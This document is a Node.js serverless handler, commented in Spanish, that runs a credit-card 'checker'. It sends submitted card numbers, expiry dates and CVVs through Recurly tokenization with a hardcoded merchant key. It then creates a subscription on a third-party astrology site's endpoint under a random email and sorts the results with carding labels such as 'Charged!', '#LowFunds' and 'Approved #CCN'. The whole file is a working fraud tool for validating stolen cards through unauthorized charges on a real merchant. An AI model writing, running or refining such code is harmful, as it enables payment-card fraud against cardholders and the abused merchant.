const axios = require('axios');

// Tokens válidos (en memoria)
const validTokens = new Map();

// Middleware para obtener la IP del cliente
function getClientId(req) {
  const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
  const userAgent = req.headers['user-agent'] || 'unknown';
  return `${ip}-${userAgent.substring(0, 20)}`;
}

// Verificar token
function verifyToken(token, clientId) {
  const tokenData = validTokens.get(token);
  return tokenData && tokenData.clientId === clientId && tokenData.expiresAt > Date.now();
}

// Generar nuevo token
function generateToken(clientId) {
  const token = Math.random().toString(36).substring(2, 15) + 
              Math.random().toString(36).substring(2, 15);
  
  validTokens.set(token, {
    clientId: clientId,
    expiresAt: Date.now() + 30000 // 30 segundos
  });
  
  return token;
}

// Función para generar email aleatorio
function generateRandomEmail() {
  const names = ['john', 'jane', 'mike', 'sara', 'alex', 'emma', 'james', 'lisa'];
  const domains = ['gmail.com', 'yahoo.com', 'hotmail.com', 'outlook.com'];
  const name = names[Math.floor(Math.random() * names.length)];
  const randomNum = Math.floor(Math.random() * 1000);
  const domain = domains[Math.floor(Math.random() * domains.length)];
  return `${name}${randomNum}@${domain}`;
}

// Crear token con Recurly
async function createRecurlyToken(cardNumber, month, year, cvc) {
  try {
    const response = await axios.post(
      'https://api.recurly.com/js/v1/token',
      new URLSearchParams({
        'first_name': 'Bruno',
        'last_name': 'Alexis',
        'number': cardNumber,
        'browser[color_depth]': '24',
        'browser[java_enabled]': 'false',
        'browser[language]': 'es-US',
        'browser[referrer_url]': 'https://mysticinsight.online/mi/subscription',
        'browser[screen_height]': '1280',
        'browser[screen_width]': '800',
        'browser[time_zone_offset]': '420',
        'browser[user_agent]': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36',
        'month': month,
        'year': year,
        'cvv': cvc,
        'version': '4.33.1',
        'key': 'ewr1-GHqWaQhLRDLkFqmH9MVxeE',
        'deviceId': 'siaXX9TbekYH1S1C',
        'sessionId': 'Z0VJJh0T0F7Zuwmq',
        'instanceId': 'jGAuKKML687jvFC0'
      }).toString(),
      {
        headers: {
          'authority': 'api.recurly.com',
          'accept': '*/*',
          'content-type': 'application/x-www-form-urlencoded',
          'origin': 'https://api.recurly.com',
          'referer': 'https://api.recurly.com/js/v1/field.html',
          'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36'
        }
      }
    );
    
    return response.data;
  } catch (error) {
    console.error('Error creating token:', error.response?.data || error.message);
    throw error;
  }
}

// Crear suscripción con Recurly
async function createSubscription(tokenId) {
  try {
    const response = await axios.post(
      'https://subtrack.turbograms.com/rec/create-subscription-no-user',
      {
        plan_id: 'msi_lpr_6month',
        token_id: tokenId,
        email: generateRandomEmail(),
        attribution: {
          event_source_url: 'https://mysticinsight.online/mi/subscription',
          client_user_agent: 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36'
        }
      },
      {
        headers: {
          'authority': 'subtrack.turbograms.com',
          'content-type': 'text/plain',
          'origin': 'https://mysticinsight.online',
          'referer': 'https://mysticinsight.online/',
          'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36'
        }
      }
    );
    
    return response;
  } catch (error) {
    console.error('Error creating subscription:', error.response?.data || error.message);
    throw error;
  }
}

// Funciones auxiliares
function getBrandFromNumber(cardNumber) {
  if (cardNumber.startsWith('4')) return 'VISA';
  if (cardNumber.startsWith('5')) return 'MASTERCARD';
  if (cardNumber.startsWith('3')) return 'AMEX';
  if (cardNumber.startsWith('6')) return 'DISCOVER';
  return 'UNKNOWN';
}

function getBankFromNumber(cardNumber) {
  // Simulación simple de banco basada en BIN
  const bin = cardNumber.substring(0, 6);
  return `BANK (${bin})`;
}

function getTypeFromNumber(cardNumber) {
  // Simulación de tipo basada en último dígito
  return parseInt(cardNumber.slice(-1)) % 2 === 0 ? 'CREDIT' : 'DEBIT';
}

// Función principal para verificar una tarjeta
async function checkCard(cardNumber, month, year, cvc) {
  try {
    console.log('Starting card check process...');
    
    // Paso 1: Crear token
    const tokenResponse = await createRecurlyToken(cardNumber, month, year, cvc);
    console.log('Token created:', tokenResponse.id);
    
    if (!tokenResponse || !tokenResponse.id) {
      return {
        success: false,
        message: 'Could not create token',
        details: tokenResponse
      };
    }
    
    // Paso 2: Crear suscripción
    const subscriptionResponse = await createSubscription(tokenResponse.id);
    console.log('Subscription response received');

    // Procesar respuesta
    let status, message;
    
    if (subscriptionResponse.status === 302 || subscriptionResponse.headers?.location) {
      status = "approved";
      message = "Charged! 🟩 [ $1.00 ]";
    } else if (subscriptionResponse.data?.error?.toLowerCase().includes('insufficient funds')) {
      status = "approved";
      message = "Approved! #LowFunds 🟩";
    } else if (subscriptionResponse.data?.error?.toLowerCase().includes('cvv') || 
               subscriptionResponse.data?.error?.toLowerCase().includes('security code')) {
      status = "approved";
      message = "Approved #CCN! 🟩";
    } else {
      status = "declined";
      message = "Your card was declined. 🔴";
    }

    // Retornar resultado
    return {
      success: true,
      card: {
        number: `${cardNumber.substring(0, 6)}xxxxxx${cardNumber.substring(cardNumber.length - 4)}`,
        brand: getBrandFromNumber(cardNumber),
        bank: getBankFromNumber(cardNumber),
        type: getTypeFromNumber(cardNumber)
      },
      result: message,
      status: status
    };

  } catch (error) {
    console.error('Error in card check process:', error);
    
    // Manejar errores específicos
    if (error.response?.data?.error?.toLowerCase().includes('cvv') || 
        error.response?.data?.error?.toLowerCase().includes('security code')) {
      return {
        success: true,
        card: {
          number: `${cardNumber.substring(0, 6)}xxxxxx${cardNumber.substring(cardNumber.length - 4)}`,
          brand: getBrandFromNumber(cardNumber),
          bank: getBankFromNumber(cardNumber),
          type: getTypeFromNumber(cardNumber)
        },
        result: "Approved #CCN! 🟩",
        status: "approved"
      };
    }

    return {
      success: false,
      message: error.message || 'Error checking card',
      error: error.toString()
    };
  }
}

// Manejador principal
module.exports = async (req, res) => {
  // Habilitar CORS
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Authorization, Content-Type');
  
  // Manejar OPTIONS para preflight
  if (req.method === 'OPTIONS') {
    return res.status(200).end();
  }
  
  // Solo permitir POST
  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Method not allowed' });
  }
  
  try {
    // Verificar token
    const authHeader = req.headers['authorization'];
    const token = authHeader && authHeader.split(' ')[1];
    const clientId = getClientId(req);
    
    if (!token) {
      return res.status(401).json({
        success: false,
        message: 'Authentication required'
      });
    }
    
    if (!verifyToken(token, clientId)) {
      return res.status(403).json({
        success: false,
        message: 'Invalid or expired token'
      });
    }
    
    // Generar nuevo token
    const newToken = generateToken(clientId);
    
    // Verificar datos de la tarjeta
    const { cardNumber, month, year, cvc } = req.body;
    
    if (!cardNumber || !month || !year || !cvc) {
      return res.status(400).json({ 
        success: false, 
        message: 'Missing required card details' 
      });
    }
    
    // Verificar tarjeta
    const result = await checkCard(cardNumber, month, year, cvc);
    
    // Incluir nuevo token en respuesta
    result.token = newToken;
    
    return res.status(200).json(result);
  } catch (error) {
    console.error('Check error:', error);
    return res.status(500).json({
      success: false,
      message: 'Server error during card check',
      error: error.message || 'Unknown error'
    });
  }
};
